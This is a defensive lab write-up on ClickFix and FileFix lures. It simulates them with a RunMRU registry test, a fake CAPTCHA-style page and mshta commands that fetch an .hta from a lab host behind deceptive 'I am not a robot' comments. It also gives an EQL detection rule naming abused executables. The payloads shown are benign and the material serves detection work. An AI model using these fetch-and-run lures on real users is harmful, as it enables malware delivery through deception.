
<!-- https://github.com/SigmaHQ/sigma/blob/1751ef8673365444ae44eb38887d3025982f4794/rules/windows/registry/registry_set/registry_set_runmru_susp_command_execution.yml#L8
https://github.com/SigmaHQ/sigma/blob/1751ef8673365444ae44eb38887d3025982f4794/rules-threat-hunting/windows/registry/registry_set/registry_set_runmru_command_execution.yml#L8 -->

# AnyFix Technique
This is a deep dive into the variants of *Fix threats (e.g. ClickFix, FileFix, and PromptFix), which have seen quick adoption by threat actors. This is a procedure for technique [T1204.004](https://attack.mitre.org/techniques/T1204/004/).

## Threat Intelligence
ClickFix emerged in late 2023 as a technique abusing fake error or CAPTCHA dialogs to trick users into pasting malicious code. Initially seen in cybercrime campaigns, it quickly spread to state-sponsored groups through 2024. Attackers leverage trusted interfaces like run dialogs, terminals, and file explorer paths for execution. Variants evolved into FileFix and PromptFix, with different attack sequences. By 2025 it has become a common cross-platform delivery method for stealers, RATs, ransomware, and custom malware.

References:

- [(Microsoft) Think before you Click(Fix): Analyzing the ClickFix social engineering technique ](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/)
- [(Proofpoint) Security Brief: ClickFix Social Engineering Technique Floods Threat Landscape](https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape)
- [(KQLQuery.com) Investigating ClickFix Incidents](https://kqlquery.com/posts/investigate-clickfix/)
- [(mrd0x.com) FileFix - A ClickFix Alternative](https://mrd0x.com/filefix-clickfix-alternative/)
- [(BleepingComputer) From ClickFix to MetaStealer: Dissecting Evolving Threat Actor Techniques](https://www.bleepingcomputer.com/news/security/from-clickfix-to-metastealer-dissecting-evolving-threat-actor-techniques/)
- [(Sekoia) Interlock ransomware evolving under the radar](https://blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/)
- [(Elastic) A Wretch Client: From ClickFix deception to information stealer deployment](https://www.elastic.co/security-labs/a-wretch-client)

## Attack Simulation
We simulate parts of the attack to generate logs for further analysis. There are various options available:

### Atomic Red Team
The [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) project develops small and highly portable detection tests. They have created a special test for Clickfix as well, where Powershell is used to insert a payload as value for the RunMRU registry key. This simulation only focuses on what makes the ClickFix technique unique and ignores any other traces a typical attack might leave behind.  

!!! note "Atomic Red Team test for ClickFix"
    [***Atomic Red Team: T1204.002 Test #12 - ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell***](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md#atomic-test-12---clickfix-campaign---abuse-runmru-to-launch-mshta-via-powershell) 

    *Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches mshta.exe with a remote payload:*

    ``` ps1
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
    ```

### Simulated ClickFix & FileFix Page
For a more realistic simulation, a static simulation webpage can be crafted and hosted within the lab for live interaction using the victim machine. We host HTML pages using Python on the Kali host and browse to them using the Windows host. 

#### Webpages
We write HTML code to simulate the techniques in our victim host.

=== "ClickFix"

    ??? note "HTML code for simulated ClickFix page"
        Embedded code from the 'projects' folder in the GitHub repository. Contains example payload.

        ``` html linenums="1"
        --8<-- "./projects/security_lab/research/anyfix/clickfix.html"
        ```

    ![clickfix_lure](../../../media/lab/anyfix/clickfix_lure.png){ align=left }
    /// caption
    Simulated ClickFix-style page.
    ///

=== "FileFix"

    ??? note "HTML code for simulated FileFix page"
        Embedded code from the 'projects' folder in the GitHub repository. Contains example payload.

        ``` html linenums="1"
        --8<-- "./projects/security_lab/research/anyfix/filefix.html"
        ```

    ![filefix_lure](../../../media/lab/anyfix/filefix_lure.png){ align=left }
    /// caption
    Simulated FileFix-style page.
    ///

#### Payloads
There is a large variety of payloads that can be used for these techniques, as can be seen in the reports linked on top of this page. One of the original payloads leveraged .HTA files through Mshta. We will be using those to simulate the attack. 

=== "ClickFix"

    ![clickfix_payload](../../../media/lab/anyfix/clickfix_payload.png){ align=left }
    /// caption
    Simulated ClickFix Payload in Windows Run Dialog.
    ///

    !!! note "Mshta payload"
        Simulates a user pasting a potentially malicious Mshta command into the Windows run dialog, following a typical ClickFix structure to deceive users. This payload will open the Windows calculator application.

        ``` ps1
        mshta.exe http://192.168.1.100/open_calc.hta # ✅ I am not a robot - Verification ID: 123456 - Press OK
        ```

        ??? note "Code for simulated .HTA payload"
            Embedded code from the 'projects' folder in the GitHub repository. Contains payload to open Windows Calculator.

            ``` html linenums="1"
            --8<-- "./projects/security_lab/research/anyfix/open_calc.hta"
            ```

    !!! note "Powershell payload"   
        Simulates a user pasting a potentially malicious Powershell command into the Windows run dialog, following a typical ClickFix structure to deceive users.

        ``` ps1
        powershell Invoke-RestMethod -Uri "https://www.cloudflare.com" -Method GET  # ✅ I am not a robot - Verification ID: 123456 - Press OK
        ```
    

=== "FileFix"

    ![filefix_payload](../../../media/lab/anyfix/filefix_payload.png){ align=left }
    /// caption
    Simulated FileFix Payload in Windows Explorer.
    ///

    !!! note "Mshta payload"
        Simulates a user pasting a potentially malicious Mshta command into the Windows run dialog, following a typical ClickFix structure to deceive users. This payload will open the Windows calculator application.

        ``` ps1
        mshta.exe http://192.168.1.100/open_calc.hta  # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx
        ```

        ??? note "Code for simulated .HTA payload"
            Embedded code from the 'projects' folder in the GitHub repository. Contains payload to open Windows Calculator.

            ``` html linenums="1"
            --8<-- "./projects/security_lab/research/anyfix/open_calc.hta"
            ```

    !!! note "Powershell payload"   
        Simulates a user pasting a potentially malicious Powershell command into the Windows Explorer, following a typical FileFix structure to deceive users.

        ``` ps1
        powershell Invoke-RestMethod -Uri "https://www.cloudflare.com" -Method GET  # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx
        ```
 

## Host Logs

=== "ClickFix"
    The simulation has generated over 250 logs. Most of these are from Sysmon as expected because of the trace configuration.   

    Elastic Defend did not capture RunMRU registry changes. Might be policy thing, but did not find answer.

    ![clickfix_logs_summary](../../../media/lab/anyfix/clickfix_logs_summary.png){ align=left }
    /// caption
    Summary of logs generated by ClickFix simulation. 
    ///

    ![clickfix_logs_endpoint](../../../media/lab/anyfix/clickfix_logs_endpoint.png){ align=left }
    /// caption
    Logs generated by Elastic Agent.
    ///

    ![clickfix_logs_endpoint](../../../media/lab/anyfix/clickfix_logs_sysmon.png){ align=left }
    /// caption
    Logs generated by Sysmon (filtered for relevance).
    ///

<!-- what do we see with ClickFix
- Command execution (Elastic agent, Symon, Powershell)
- DNS request (Zeek, Symon)
- Registry RunMRU value set (Sysmon)

TODO
- Powershell logs detection
- toml -->


## Detection & Hunting
None of the default Elastic rules are triggered during the simulated sequence. 

Elastic has published a [detection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/execution_suspicious_command_shell_execution_via_windows_run.toml) rule for the Elastic Security for Endpoint product. This contains an EQL query that can be adapted to create a detection rule in Kibana, see query below. Lines contain annotations at the beginning to understand the logic used. Note that some elements of the original EQL were removed because of unpopulated fields in Kibana (fields related to threads).

TBD

``` sql linenums="1" title="[EQL] [Elastic Defend + Symon] Suspicious command shell execution via Windows run"
/* (1)! */ process where (event.action == "start" or event.action == "Process creation") and
/* (2)! */ process.name : ("cmd.exe", "powershell.exe", "curl.exe", "msiexec.exe", "mshta.exe", "wscript.exe", "cscript.exe") and
/* (3)! */ process.parent.name : "explorer.exe" and 
/* (4)! */ process.args_count >= 2 and
/* (5)! */ not (process.name : "cmd.exe" and process.args : ("*.bat*", "*.cmd", "dir", "ipconfig", "C:\\WINDOWS\\system32\\sconfig.cmd ", "Code\\bin\\code.cmd ")) and
/* (6)! */ not (process.name : "powershell.exe" and process.args : ("Start-Process powershell -Verb RunAs", "C:\\*.ps1", "-SPLAGroup", "\\\\*\\netlogon\\*.ps1")) and
/* (7)! */ not (process.name : "msiexec.exe" and process.args : "?:\\*.msi") and
/* (8)! */ not process.command_line : ("\"C:\\WINDOWS\\system32\\cmd.exe\" /k net use",
                                "\"C:\\WINDOWS\\system32\\cmd.exe\" -a",
                                "\"C:\\Windows\\system32\\msiexec.exe\" /regserver",
                                "\"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -ep bypass") and
/* (9)! */ not (process.name : ("wscript.exe", "cscript.exe") and process.args : ("\\\\*\\MapNetworkDrives.vbs", "?:\\*.js", "?:\\*.vbs"))
```

1. **Event action filter:** Only include process creation events (Elastic Defend and Symon respectively).
2. **Process name filter:** Include high-risk or commonly abused executables.
3. **Parent process filter:** Restrict to processes launched by Explorer (user-initiated).
4. **Argument count filter:** Only include processes with two or more arguments, indicating significant execution.
5. **cmd.exe exclusion**: Filters out typical command prompt scripts and administrative commands.
6. **powershell.exe exclusion**: Filters normal PowerShell scripts and self-elevating commands.
7. **msiexec.exe exclusion**: Ignores standard MSI installer executions.
8. **specific command lines exclusion**: Excludes known safe system commands.
9. **wscript/cscript exclusion**: Ignores standard Windows Script Host scripts such as network drive mapping.









